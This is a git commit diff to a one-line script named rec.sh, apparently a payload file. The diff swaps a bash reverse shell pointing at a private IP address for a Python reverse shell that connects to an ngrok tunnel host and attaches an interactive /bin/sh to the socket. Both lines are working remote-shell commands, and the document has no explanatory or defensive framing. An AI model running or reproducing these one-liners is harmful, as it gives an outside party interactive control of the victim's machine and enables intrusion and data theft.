f2f4884bf5fefcb5e29d07f2ea335e8ee4ea5fdf
MasterMyFuture <755132002@qq.com>
2021-09-07 22:44:41 +0800

    Update rec.sh

--- rec.sh
+++ rec.sh
@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/192.168.43.161/44440>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("4.tcp.ngrok.io",19743));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
